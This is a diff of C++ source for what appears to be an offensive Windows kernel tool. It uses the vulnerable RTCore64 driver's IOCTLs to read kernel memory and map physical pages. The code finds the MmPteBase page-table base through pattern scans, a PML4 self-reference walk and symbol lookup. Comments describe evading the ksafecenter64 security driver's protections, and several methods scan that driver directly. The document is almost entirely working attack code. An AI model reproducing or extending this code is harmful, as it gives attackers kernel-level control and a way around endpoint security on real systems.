@@ -153,11 +153,55 @@ static DWORD64 FindMmPteBaseByMiGetPtePattern(const NtoskrnlImage& img) {
         DWORD wEnd   = ((i + 80 + 7) < end)  ? (i + 80) : (end - 7);
 
         for (DWORD j = wStart; j < wEnd; j++) {
-            // Accept both ADD r64,[rip+X] (0x03) and MOV r64,[rip+X] (0x8B).
-            // Win10 22H2 MiGetPteAddress uses MOV r11,[MmPteBase] then register ADD,
-            // so we must count MOV references too to find the right variable.
             if (j + 6 >= end) continue;
-            BYTE rex = buf[j], op = buf[j+1], modrm = buf[j+2];
+            BYTE rex = buf[j], op = buf[j+1];
+
+            // ── Pattern A: MiGetPteAddress sequence detection ────────────────
+            // MiGetPteAddress on Win10 19041+ has this exact sequence:
+            //   48 C1 E9 09              SHR RCX, 9
+            //   48 B8 <mask>             MOV RAX, 0x7FFFFFFFF8  (mask)
+            //   48 23 C8                 AND RCX, RAX
+            //   48 B8 <MmPteBase>        MOV RAX, MmPteBase     ← target
+            //   48 03 C1                 ADD RAX, RCX
+            //   C3                       RET
+            //
+            // We already anchored on the SHR/SAR. Now look for the SECOND
+            // MOV r64, imm64 after the anchor — the first one is the mask.
+            // The disk file has a placeholder; we Rd64 the live kernel value.
+            if (rex == 0x48 && (op >= 0xB8 && op <= 0xBF) && j + 10 <= end) {
+                DWORD64 disk_imm = *reinterpret_cast<const DWORD64*>(&buf[j + 2]);
+                // Skip the mask constant (0x7FFFFFFFF8 or similar non-kernel VA)
+                if ((disk_imm >> 48) != 0xFFFF) continue;
+                // Must be 512GB-aligned and not MmSystemRangeStart
+                if ((disk_imm & ((1ULL << 39) - 1)) != 0) continue;
+                if (disk_imm == 0xFFFF800000000000ULL) continue;
+                // Read the LIVE value from kernel memory at this offset.
+                DWORD instrRVA = (j - esec.foa) + esec.rva;
+                DWORD64 imm_kva = img.kBase + instrRVA + 2;
+                DWORD64 live_imm = g_drv->Rd64(imm_kva);
+                if (g_debug)
+                    printf("[pte] MiGetPteAddr: disk=0x%016llX live=0x%016llX (RVA 0x%X)\n",
+                           disk_imm, live_imm, instrRVA);
+                if ((live_imm >> 48) == 0xFFFF && (live_imm & ((1ULL << 39) - 1)) == 0
+                    && live_imm != 0xFFFF800000000000ULL) {
+                    // Verify: the instruction before this should be AND (48 23 xx)
+                    // and the instruction after should be ADD (48 03 xx) + RET (C3).
+                    bool has_and_before = (j >= 3 && buf[j-3] == 0x48 && buf[j-2] == 0x23);
+                    bool has_add_ret_after = (j + 10 + 3 < end &&
+                        buf[j+10] == 0x48 && buf[j+11] == 0x03 && buf[j+13] == 0xC3);
+                    if (has_and_before || has_add_ret_after) {
+                        printf("[pte] MiGetPteAddr: MmPteBase = 0x%016llX (imm64 in .text)\n",
+                               live_imm);
+                        return live_imm;
+                    }
+                    if (g_debug)
+                        printf("[pte] MiGetPteAddr: context mismatch (no AND/ADD+RET), skipping\n");
+                }
+            }
+
+            // ── Pattern B: ADD/MOV r64, [RIP+imm32] (RIP-relative load)
+            // Older builds use: ADD r64,[rip+X] or MOV r64,[rip+X]
+            BYTE modrm = buf[j+2];
             if (rex != 0x48 && rex != 0x4C) continue;
             if (op != 0x03 && op != 0x8B) continue; // ADD or MOV (RIP-relative)
             if ((modrm & 0xC7) != 0x05) continue; // mod=00, r/m=101 (RIP-rel)
@@ -273,36 +317,25 @@ static DWORD64 FindMmPfnDatabaseByPattern(const NtoskrnlImage& img) {
     return 0;
 }
 
-// ── Method 0a: PML4 self-ref brute-force via virtual PTE read ─────────────────
-//
-// ALGORITHM:
-//   There are only 256 possible PML4 indices for the kernel half (256–511).
-//   For each candidate index 'i':
-//     MmPteBase_candidate = 0xFFFF000000000000 | (i << 39)
-//     PTE_VA = MmPteBase_candidate + (kBase >> 9)
-//   Read 8 bytes from PTE_VA.  A valid ntoskrnl PTE must be:
-//     - present (bit 0 = 1)
-//     - kernel-mode (U/S = 0)
-//     - PA in expected physical RAM range (PA > 0x1000 and < 0x1_0000_0000)
-//
-//   No MapPhys, no MmPfnDatabase, no MmPteBase global — pure virtual reads.
-//   Security software cannot intercept this without breaking all memory access.
-//
-// Returns MmPteBase value, or 0 on failure.
-// ── Method 0a: PML4 self-reference via MapPhys (hardware level, no kernel globals)
+// ── Method 0a: PML4 self-reference via physical read + math verification
 //
 // Read CR3 from System EPROCESS.DirectoryTableBase (+0x28).
-// Map the PML4 physical page via RTCore64's MmMapIoSpace IOCTL.
-// Scan entries [256..511] for the self-referencing entry (PA points to PML4 itself).
-// MmPteBase = 0xFFFF000000000000 | (self_ref_index << 39).
+// Map the PML4 physical page and scan for the self-referencing entry.
+// MmPteBase = sign_extend(self_ref_index << 39).
 //
-// This is completely independent of ntoskrnl globals that ksafecenter64 patches.
-// Two paths:
-//   Path A: MapPhys → read physical PML4 directly (fastest, may fail on low PA)
-//   Path B: Self-map brute-force → try all 256 candidate MmPteBase values and
-//           read through the PTE self-map using Rd64 (no MapPhys needed).
-//           Write and map are two sides of the same coin — the PML4 page IS
-//           already mapped somewhere in the self-map, we just need to find where.
+// PATH A: MmMapIoSpace (IOCTL 0x80002050) — fast, but refuses RAM pages on low PA.
+// PATH A2: \Device\PhysicalMemory (IOCTL 0x80002058) — maps any PA including RAM.
+// PATH B: Math verification — for each PML4 entry with Present=1, compute
+//         PteVA = candidate + (ntBase >> 9) and verify through virtual read.
+//         Safe: only reads PteVAs where PML4[i] is confirmed Present.
+//
+// Discrete math proof (2026-04-11):
+//   shift = (ntBase & 0x0000FFFFFFFFF000) >> 9
+//   shift < 2^39 for all kernel ntBase addresses (0xFFFFF8xx range)
+//   ⇒ pteVA's PML4 index == candidate index i (no carry)
+//   ⇒ Rd64(pteVA) is safe IFF PML4[i].Present == 1
+//
+// This is completely independent of ntoskrnl globals (immune to DKOM patching).
 static DWORD64 FindMmPteBaseByCR3Walk() {
     // 1. System EPROCESS via PsInitialSystemProcess export
     DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
@@ -321,34 +354,94 @@ static DWORD64 FindMmPteBaseByCR3Walk() {
     // Clear low 12 bits (PCID, flags) to get raw PML4 physical address
     DWORD64 pml4_pa = cr3 & 0x000FFFFFFFFFF000ULL;
 
-    // ── Path A: MapPhys (direct physical read) ──────────────────────────────
+    // ── Try mapping PML4 physical page ──────────────────────────────────────
+    // Path A: MmMapIoSpace (fast, may fail on RAM pages)
+    // Path A2: \Device\PhysicalMemory (always works, fallback)
     DWORD64 pml4_va = g_drv->MapPhys(pml4_pa, 4096);
-    if (pml4_va) {
-        DWORD64 result = 0;
-        for (int i = 256; i < 512; i++) {
-            DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
-            DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
-            if (!entry_pa) continue;
-            if (entry_pa == pml4_pa) {
-                result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
-                printf("[pte] PML4Walk(MapPhys): self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
-                       i, i, cr3, result);
-                break;
-            }
-        }
-        g_drv->UnmapPhys(pml4_va, 4096);
-        if (result) return result;
+    bool used_section = false;
+
+    if (!pml4_va) {
+        // Path A failed (MmMapIoSpace refuses RAM pages on low PA).
+        // Fall back to \Device\PhysicalMemory section mapping.
+        pml4_va = g_drv->MapPhysSection(pml4_pa, 4096);
+        used_section = true;
+        if (pml4_va && g_debug)
+            printf("[pte] PML4Walk: MapPhys failed, using PhysicalMemory section at VA=0x%016llX\n", pml4_va);
     }
 
-    // ── Path B: REMOVED (caused 4x BSOD 0x50) ─────────────────────────────
-    // Both blind brute-force and ntoskrnl-probe variants read VAs that appear
-    // valid (kernel range, QWORD-aligned) but aren't actually mapped.
-    // PteVaOf(ntoskrnl) for wrong candidate MmPteBase does NOT necessarily
-    // land in mapped memory — the self-map region is sparse.
-    // Fall through to Method 0b (PhysWalk) or pattern scan + PteSafetyCheck.
-    if (g_debug)
-        printf("[pte] PML4Walk: MapPhys failed for PA=0x%012llX — Path B disabled (4x BSOD)\n", pml4_pa);
-    return 0;
+    if (!pml4_va) {
+        if (g_debug)
+            printf("[pte] PML4Walk: both MapPhys and MapPhysSection failed for PA=0x%012llX\n", pml4_pa);
+        return 0;
+    }
+
+    // ── Path A: Physical scan — find self-referencing PML4 entry ────────────
+    DWORD64 result = 0;
+    int self_ref_idx = -1;
+    bool present_map[512] = {};  // track which PML4 entries are present
+
+    for (int i = 256; i < 512; i++) {
+        DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
+        DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
+        present_map[i]   = (entry & 1) != 0;  // Present bit
+
+        if (!entry_pa || !(entry & 1)) continue;
+        if (entry_pa == pml4_pa) {
+            self_ref_idx = i;
+            result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
+            printf("[pte] PML4Walk(phys%s): self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
+                   used_section ? "/section" : "", i, i, cr3, result);
+        }
+    }
+
+    // Unmap physical page
+    if (used_section)
+        g_drv->UnmapPhysSection(pml4_va);
+    else
+        g_drv->UnmapPhys(pml4_va, 4096);
+
+    if (!result) {
+        printf("[pte] PML4Walk: no self-referencing PML4 entry found (CR3=0x%llX)\n", cr3);
+        return 0;
+    }
+
+    // ── Path B: Math verification via safe virtual read ─────────────────────
+    // We found the self-ref index physically. Now verify through the self-map:
+    // PteVA = MmPteBase + ((ntBase & 0x0000FFFFFFFFF000) >> 9)
+    // Since PML4[self_ref_idx].Present == 1, this read is guaranteed safe.
+    //
+    // Discrete math: pteVA's PML4 index == self_ref_idx (no carry from shift)
+    // ⇒ pteVA lands in the self-map region ⇒ Rd64 cannot fault.
+    LPVOID drvs[1]; DWORD cbNeeded;
+    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cbNeeded) && drvs[0]) {
+        DWORD64 ntBase = (DWORD64)drvs[0];
+        DWORD64 pteVA = result + ((ntBase & 0x0000FFFFFFFFF000ULL) >> 9);
+
+        // Verify PteVA's PML4 index matches self_ref_idx (math invariant)
+        int pteVA_pml4 = (int)((pteVA >> 39) & 0x1FF);
+        if (pteVA_pml4 != self_ref_idx) {
+            // Math invariant violated — should never happen
+            printf("[pte] PML4Walk(verify): MATH ERROR! pteVA PML4[%d] != self_ref[%d]\n",
+                   pteVA_pml4, self_ref_idx);
+            return result;  // still return physical result
+        }
+
+        // Safe read: PML4[self_ref_idx] is Present (confirmed by physical scan)
+        DWORD64 pteVal = g_drv->Rd64(pteVA);
+        bool pte_present = (pteVal & 1) != 0;
+        DWORD64 pte_pa   = pteVal & 0x000FFFFFFFFFF000ULL;
+
+        if (pte_present && pte_pa) {
+            if (g_debug)
+                printf("[pte] PML4Walk(verify): PTE[ntoskrnl]=0x%016llX (Present, PA=0x%012llX) ✓\n",
+                       pteVal, pte_pa);
+        } else {
+            printf("[pte] PML4Walk(verify): PTE[ntoskrnl]=0x%016llX — unexpected, but physical result stands\n",
+                   pteVal);
+        }
+    }
+
+    return result;
 }
 
 // ── Method 0b: CR3 physical walk via MmPfnDatabase ───────────────────────────
@@ -1781,26 +1874,74 @@ static DWORD64 FindMmPteBaseBySymbol() {
         swprintf_s(filePath, L"%s\\System32\\ntoskrnl.exe", winDir);
     }
 
-    // Initialize symbol handler
-    HANDLE hProc = GetCurrentProcess();
-    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
+    // Initialize symbol handler with a unique pseudo-handle to avoid
+    // conflicts with other dbghelp users in the same process.
+    // GetCurrentProcess() (-1) is shared; using a unique handle is safer.
+    HANDLE hSym = (HANDLE)(ULONG_PTR)0xDEAD0042;
 
-    // Use Microsoft symbol server + local cache
-    if (!SymInitializeW(hProc, L"srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols", FALSE)) {
-        // Fallback: try without symbol server
-        if (!SymInitializeW(hProc, nullptr, FALSE)) {
-            if (g_debug) printf("[pte] Symbol: SymInitialize failed: %lu\n", GetLastError());
+    // Enable SYMOPT_DEBUG in debug mode for verbose symbol diagnostics
+    DWORD symOpts = SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_AUTO_PUBLICS;
+    if (g_debug) symOpts |= SYMOPT_DEBUG;
+    SymSetOptions(symOpts);
+
+    // Build symbol path: always use a known-good path with local cache.
+    // The env _NT_SYMBOL_PATH may be malformed (e.g., "srv**http://..." missing
+    // local cache dir), so we always override with a complete path.
+    WCHAR symPath[2048];
+    wcscpy_s(symPath,
+        L"srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols;"
+        L"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\sym");
+
+    if (g_debug) wprintf(L"[pte] Symbol: path = %s\n", symPath);
+    if (g_debug) wprintf(L"[pte] Symbol: ntoskrnl file = %s\n", filePath);
+
+    if (!SymInitializeW(hSym, symPath, FALSE)) {
+        DWORD err = GetLastError();
+        if (g_debug) printf("[pte] Symbol: SymInitializeW failed: %lu\n", err);
+        // Try with NULL path (use _NT_SYMBOL_PATH from environment)
+        if (!SymInitializeW(hSym, nullptr, FALSE)) {
+            if (g_debug) printf("[pte] Symbol: SymInitializeW(NULL) also failed: %lu\n", GetLastError());
             return 0;
         }
     }
 
-    // Load ntoskrnl module symbols at its kernel base address
-    DWORD64 modBase = SymLoadModuleExW(hProc, nullptr, filePath, nullptr, kernBase, 0, nullptr, 0);
-    if (!modBase) {
-        if (g_debug) printf("[pte] Symbol: SymLoadModuleEx failed: %lu\n", GetLastError());
-        SymCleanup(hProc);
-        return 0;
+    // Load ntoskrnl module symbols at its kernel base address.
+    // Use the on-disk PE size (SizeOfImage) for accurate module loading.
+    DWORD imageSize = 0;
+    {
+        HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hf != INVALID_HANDLE_VALUE) {
+            BYTE hdrbuf[0x200];
+            DWORD rd;
+            if (ReadFile(hf, hdrbuf, sizeof(hdrbuf), &rd, NULL) && rd >= 0x100) {
+                auto* dos = (IMAGE_DOS_HEADER*)hdrbuf;
+                if (dos->e_magic == IMAGE_DOS_SIGNATURE && dos->e_lfanew < 0x180) {
+                    auto* nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
+                    if (nt->Signature == IMAGE_NT_SIGNATURE)
+                        imageSize = nt->OptionalHeader.SizeOfImage;
+                }
+            }
+            CloseHandle(hf);
+        }
     }
+    if (!imageSize) imageSize = 0x01100000;  // reasonable default for ntoskrnl
+
+    if (g_debug)
+        printf("[pte] Symbol: loading module at base=0x%016llX size=0x%X\n", kernBase, imageSize);
+
+    DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, filePath, nullptr, kernBase, imageSize, nullptr, 0);
+    if (!modBase) {
+        DWORD err = GetLastError();
+        // ERROR_SUCCESS (0) with modBase=0 means module already loaded — try anyway
+        if (err != 0) {
+            if (g_debug) printf("[pte] Symbol: SymLoadModuleExW failed: %lu\n", err);
+            SymCleanup(hSym);
+            return 0;
+        }
+        modBase = kernBase;  // assume loaded at requested base
+    }
+
+    if (g_debug) printf("[pte] Symbol: module loaded at 0x%016llX\n", modBase);
 
     // Resolve MmPteBase symbol
     BYTE symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME] = {};
@@ -1809,23 +1950,35 @@ static DWORD64 FindMmPteBaseBySymbol() {
     sym->MaxNameLen = MAX_SYM_NAME;
 
     DWORD64 result = 0;
-    if (SymFromName(hProc, "MmPteBase", sym)) {
+    if (SymFromName(hSym, "MmPteBase", sym)) {
         DWORD64 varVA = sym->Address;
-        // Read the value
         DWORD64 val = g_drv->Rd64(varVA);
         if (g_drv->IsKernelVA(val) && (val & ((1ULL << 39) - 1)) == 0) {
             printf("[pte] Symbol: MmPteBase @ 0x%016llX = 0x%016llX (via PDB)\n",
                    varVA, val);
             result = val;
         } else if (g_debug) {
-            printf("[pte] Symbol: MmPteBase @ 0x%016llX = 0x%016llX (invalid, not 512GB-aligned)\n",
+            printf("[pte] Symbol: MmPteBase @ 0x%016llX = 0x%016llX (invalid)\n",
                    varVA, val);
         }
     } else {
-        if (g_debug) printf("[pte] Symbol: SymFromName(MmPteBase) failed: %lu\n", GetLastError());
+        DWORD err = GetLastError();
+        if (g_debug) printf("[pte] Symbol: SymFromName(MmPteBase) failed: %lu\n", err);
+        // Try with module-qualified name
+        if (SymFromName(hSym, "nt!MmPteBase", sym)) {
+            DWORD64 varVA = sym->Address;
+            DWORD64 val = g_drv->Rd64(varVA);
+            if (g_drv->IsKernelVA(val) && (val & ((1ULL << 39) - 1)) == 0) {
+                printf("[pte] Symbol: MmPteBase @ 0x%016llX = 0x%016llX (via PDB, nt! prefix)\n",
+                       varVA, val);
+                result = val;
+            }
+        } else if (g_debug) {
+            printf("[pte] Symbol: SymFromName(nt!MmPteBase) also failed: %lu\n", GetLastError());
+        }
     }
 
-    SymCleanup(hProc);
+    SymCleanup(hSym);
     return result;
 }
 
@@ -1910,47 +2063,72 @@ DWORD64 GetMmPteBase() {
         }
     }
 
-    // ── Method 0c: scan loaded kernel drivers for stored copy of MmPteBase ─────
-    {
-        DWORD64 val = FindMmPteBaseByDriverScan(false);
-        if (val && g_drv->IsKernelVA(val)) {
-            s_pteBase = val;
-            return s_pteBase;
-        }
-    }
-
     // ── Method 1: ntoskrnl export (present on a handful of early RS builds) ──
     DWORD64 varVA = KUtil::KernelExport("MmPteBase");
     const char* method = "export";
 
     if (!varVA) {
-        // ── Method 2 & 3: disk-scan heuristics ───────────────────────────────
+        // ── Method 2: MiGetPteAddress code-pattern scan ──────────────────────
+        // Scan ntoskrnl .text for MOV RAX, imm64 near SHR/SAR r64, 9.
+        // MiGetPteAddress loads MmPteBase as a direct 64-bit immediate on
+        // Win10 19041+, or via RIP-relative [MmPteBase] on older builds.
+        // Reading .text is ALWAYS safe (mapped, non-pageable).
+        {
+            DWORD64 result = FindMmPteBaseByMiGetPtePattern(img);
+            if (result) {
+                // Check if result is a direct value (imm64) or a variable VA
+                if (g_drv->IsKernelVA(result) && (result & ((1ULL << 39) - 1)) == 0) {
+                    // Direct imm64 value from MOV RAX, imm64 pattern
+                    printf("[pte] MmPteBase = 0x%016llX (via MiGetPteAddr imm64)\n", result);
+                    s_pteBase = result;
+                    return s_pteBase;
+                }
+                // It's a variable VA — read the value
+                varVA = result;
+                method = "MiGetPteAddr pattern";
+            }
+        }
 
-        // 2. Highest-reference-count .data global (512 GB-aligned filter)
-        varVA = FindMmPteBaseByRefScan(img);
-        if (varVA) method = "refcnt scan";
-
-        // 3. MiGetPteAddress code-pattern scan (ADD r64,[rip+X] near sar r64,9)
+        // ── Method 3: Highest-reference-count .data global ───────────────────
         if (!varVA) {
-            varVA = FindMmPteBaseByMiGetPtePattern(img);
-            if (varVA) method = "MiGetPteAddr pattern";
+            varVA = FindMmPteBaseByRefScan(img);
+            if (varVA) method = "refcnt scan";
         }
     }
 
-    if (!varVA) {
-        printf("[pte] MmPteBase: all scan methods failed — use /ptebase-set\n");
-        return 0;
+    if (varVA) {
+        DWORD64 base = g_drv->Rd64(varVA);
+        if (g_drv->IsKernelVA(base) && (base & ((1ULL << 39) - 1)) == 0) {
+            printf("[pte] MmPteBase = 0x%016llX (via %s)\n", base, method);
+            s_pteBase = base;
+            return s_pteBase;
+        }
+        if (g_debug)
+            printf("[pte] %s: varVA=0x%016llX value=0x%016llX (invalid)\n",
+                   method, varVA, base);
     }
 
-    DWORD64 base = g_drv->Rd64(varVA);
-    if (!g_drv->IsKernelVA(base)) {
-        printf("[pte] MmPteBase value 0x%016llX is not a kernel VA\n", base);
-        return 0;
+    // ── Method 4: scan loaded kernel drivers for stored copy of MmPteBase ────
+    // Last resort — third-party driver caches can be STALE after reboot.
+    // LiveKdD.SYS in particular stores a snapshot-time value that doesn't
+    // survive reboot (caused BSOD 0x3B when used with wrong MmPteBase).
+    {
+        DWORD64 val = FindMmPteBaseByDriverScan(false);
+        if (val && g_drv->IsKernelVA(val)) {
+            // Extra validation: verify the candidate is 512GB-aligned
+            if ((val & ((1ULL << 39) - 1)) != 0) {
+                if (g_debug)
+                    printf("[pte] DriverScan: 0x%016llX not 512GB-aligned, skipping\n", val);
+            } else {
+                printf("[pte] MmPteBase = 0x%016llX (via driver scan — verify with /ptebase-set if wrong)\n", val);
+                s_pteBase = val;
+                return s_pteBase;
+            }
+        }
     }
 
-    printf("[pte] MmPteBase = 0x%016llX (via %s)\n", base, method);
-    s_pteBase = base;
-    return s_pteBase;
+    printf("[pte] MmPteBase: all scan methods failed — use /ptebase-set\n");
+    return 0;
 }
 
 void SetMmPteBase(DWORD64 val) {
@@ -1959,77 +2137,151 @@ void SetMmPteBase(DWORD64 val) {
 }
 
 // Print full diagnostic for all scan methods — for debugging when scan fails.
-void CmdPteBaseScan() {
+// methodFilter: -1 = run all, 1-12 = run only that method.
+void CmdPteBaseScan(int mf) {
+    if (mf >= 0) printf("[*] Running Method %d only\n\n", mf);
     NtoskrnlImage img = LoadNtoskrnl();
-    if (!img.ok) { printf("[!] Failed to load ntoskrnl.exe\n"); return; }
+    if (!img.ok && mf != 1) { printf("[!] Failed to load ntoskrnl.exe\n"); return; }
 
-    // ── Section 0h: inline hook scan ───────────────────────────────────────────
-    printf("=== Method 0h: ntoskrnl export inline-hook scan ===\n\n");
-    {
+    auto runMethod = [&](int n) { return mf < 0 || mf == n; };
+
+    // ── Method 1: PDB symbol resolution ──────────────────────────────────────
+    if (runMethod(1)) {
+        printf("=== Method 1: PDB symbol resolution (dbghelp SymFromName) ===\n\n");
+        DWORD64 v = FindMmPteBaseBySymbol();
+        if (v)
+            printf("\n  >>> Method 1 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+        else
+            printf("  (method 1 found no candidate)\n\n");
+    }
+
+    // ── Method 2: CR3Walk ────────────────────────────────────────────────────
+    if (runMethod(2)) {
+        printf("=== Method 2: CR3Walk (MapPhys + MapPhysSection + Path B) ===\n\n");
+        DWORD64 v = FindMmPteBaseByCR3Walk();
+        if (v)
+            printf("\n  >>> Method 2 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+        else
+            printf("  (method 2 found no candidate)\n\n");
+    }
+
+    // ── Method 3: PhysWalk ───────────────────────────────────────────────────
+    if (runMethod(3)) {
+        printf("=== Method 3: CR3 / MmPfnDatabase physical walk ===\n\n");
+        DWORD64 v = FindMmPteBaseByPhysWalk(img);
+        if (v)
+            printf("\n  >>> Method 3 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+        else
+            printf("  (method 3 found no candidate)\n\n");
+    }
+
+    // ── Method 4: inline hook scan ───────────────────────────────────────────
+    if (runMethod(4)) {
+        printf("=== Method 4: ntoskrnl export inline-hook scan ===\n\n");
         DWORD64 v = FindMmPteBaseByInlineHookScan(true);
         if (v)
-            printf("\n  >>> Method 0h RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+            printf("\n  >>> Method 4 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
         else
-            printf("  (method 0h found no candidate)\n\n");
+            printf("  (method 4 found no candidate)\n\n");
     }
 
-    // ── Section 0g: SSDT hook scan ────────────────────────────────────────────
-    printf("=== Method 0g: SSDT hook scan (KeServiceDescriptorTable) ===\n\n");
-    {
+    // ── Method 5: SSDT hook scan ───────────────────────────────────────────
+    if (runMethod(5)) {
+        printf("=== Method 5: SSDT hook scan (KeServiceDescriptorTable) ===\n\n");
         DWORD64 v = FindMmPteBaseBySSdtScan(true);
         if (v)
-            printf("\n  >>> Method 0g RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+            printf("\n  >>> Method 5 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
         else
-            printf("  (method 0g found no candidate)\n\n");
+            printf("  (method 5 found no candidate)\n\n");
     }
 
-    // ── Section 0f: callback array scan ──────────────────────────────────────
-    printf("=== Method 0f: Kernel callback array scan (LoadImage/Proc/Thread notify) ===\n\n");
-    {
+    // ── Method 6: callback array scan ────────────────────────────────────────
+    if (runMethod(6)) {
+        printf("=== Method 6: Kernel callback array scan ===\n\n");
         DWORD64 v = FindMmPteBaseByCallbackScan(true);
         if (v)
-            printf("\n  >>> Method 0f RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+            printf("\n  >>> Method 6 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
         else
-            printf("  (method 0f found no candidate)\n\n");
+            printf("  (method 6 found no candidate)\n\n");
     }
 
-    // ── Section 0a: DISABLED (BSOD confirmed) ────────────────────────────────
-    printf("=== Method 0a: PML4 brute-force — DISABLED (BSOD 0x50 confirmed) ===\n");
-    printf("  RTCore64 raw-deref causes PAGE_FAULT on unmapped PTE VAs.\n");
-    printf("  Need safe physical read path before re-enabling.\n\n");
-
-    // ── Section 0d: PsLoadedModuleList walk → ksafecenter64 .data scan ──────────
-    printf("=== Method 0d: PsLoadedModuleList walk → ksafecenter64 .data scan ===\n\n");
-    {
-        DWORD64 v = FindMmPteBaseByLdrList(true);
-        if (v)
-            printf("\n  >>> Method 0d RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
-        else
-            printf("  (method 0d found no candidate)\n\n");
-    }
-
-    // ── Section 0e: Object directory walk ────────────────────────────────────
-    printf("=== Method 0e: Object directory \\Driver\\ksafecenter64 → DriverStart ===\n\n");
-    {
+    // ── Method 7: Object directory walk ──────────────────────────────────────
+    if (runMethod(7)) {
+        printf("=== Method 7: Object directory \\Driver\\ksafecenter64 ===\n\n");
         DWORD64 v = FindMmPteBaseByObjDir(true);
         if (v)
-            printf("\n  >>> Method 0e RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+            printf("\n  >>> Method 7 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
         else
-            printf("  (method 0e found no candidate)\n\n");
+            printf("  (method 7 found no candidate)\n\n");
     }
 
-    // ── Section 0c: Kernel driver memory scan ────────────────────────────────
-    printf("=== Method 0c: Kernel driver non-pageable data scan ===\n\n");
-    {
+    // ── Method 8: PsLoadedModuleList walk ────────────────────────────────────
+    if (runMethod(8)) {
+        printf("=== Method 8: PsLoadedModuleList walk → ksafecenter64 .data ===\n\n");
+        DWORD64 v = FindMmPteBaseByLdrList(true);
+        if (v)
+            printf("\n  >>> Method 8 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+        else
+            printf("  (method 8 found no candidate)\n\n");
+    }
+
+    // ── Method 9: ntoskrnl export ────────────────────────────────────────────
+    if (runMethod(9)) {
+        printf("=== Method 9: ntoskrnl export (MmPteBase) ===\n\n");
+        DWORD64 v = KUtil::KernelExport("MmPteBase");
+        if (v) {
+            DWORD64 val = g_drv->Rd64(v);
+            printf("  MmPteBase export @ 0x%016llX = 0x%016llX\n", v, val);
+            printf("\n  >>> Method 9 RESULT: MmPteBase = 0x%016llX <<<\n\n", val);
+        } else {
+            printf("  MmPteBase not in ntoskrnl export table\n");
+            printf("  (method 9 found no candidate)\n\n");
+        }
+    }
+
+    // ── Method 10: MiGetPteAddress imm64 extraction ────────────────────────
+    if (runMethod(10)) {
+        printf("=== Method 10: MiGetPteAddress imm64 extraction (.text Rd64) ===\n\n");
+        DWORD64 v = FindMmPteBaseByMiGetPtePattern(img);
+        if (v && g_drv->IsKernelVA(v) && (v & ((1ULL << 39) - 1)) == 0)
+            printf("\n  >>> Method 10 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+        else if (v)
+            printf("  varVA = 0x%016llX, Rd64 = 0x%016llX\n\n", v, g_drv->Rd64(v));
+        else
+            printf("  (method 10 found no candidate)\n\n");
+    }
+
+    // ── Method 11: RefScan ───────────────────────────────────────────────────
+    if (runMethod(11)) {
+        printf("=== Method 11: Highest-reference-count .data global ===\n\n");
+        DWORD64 v = FindMmPteBaseByRefScan(img);
+        if (v) {
+            DWORD64 val = g_drv->Rd64(v);
+            printf("  varVA = 0x%016llX, value = 0x%016llX\n", v, val);
+            if (g_drv->IsKernelVA(val) && (val & ((1ULL << 39) - 1)) == 0)
+                printf("\n  >>> Method 11 RESULT: MmPteBase = 0x%016llX <<<\n\n", val);
+            else
+                printf("  (not 512GB-aligned)\n\n");
+        } else {
+            printf("  (method 11 found no candidate)\n\n");
+        }
+    }
+
+    // ── Method 12: Driver .data scan ─────────────────────────────────────────
+    if (runMethod(12)) {
+        printf("=== Method 12: Kernel driver non-pageable data scan ===\n\n");
         DWORD64 v = FindMmPteBaseByDriverScan(true);
         if (v)
-            printf("\n  >>> Method 0c RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
+            printf("\n  >>> Method 12 RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
         else
-            printf("  (method 0c found no candidate)\n\n");
+            printf("  (method 12 found no candidate)\n\n");
     }
 
-    // ── Section 0b: CR3/MmPfnDatabase physical walk ──────────────────────────
-    printf("=== Method 0b: CR3 / MmPfnDatabase physical walk ===\n\n");
+    // ── Verbose diagnostics (only when running all methods) ──────────────────
+    if (mf >= 0) return;  // skip verbose dump when filtering
+
+    // ── CR3/MmPfnDatabase verbose dump ──────────────────────────────────────
+    printf("=== Verbose: CR3 / MmPfnDatabase physical walk ===\n\n");
     {
         DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
         if (!g_drv->IsKernelVA(sysEP)) {
@@ -2114,91 +2366,9 @@ void CmdPteBaseScan() {
         }
     }
 
-    const BYTE* buf = img.buf.data();
-
     printf("[pte] ntoskrnl base = 0x%016llX\n", img.kBase);
     printf("[pte] .text RVA=0x%08X  .data RVA=0x%08X..0x%08X\n\n",
            img.textRVA, img.dataRVA, img.dataEnd);
-
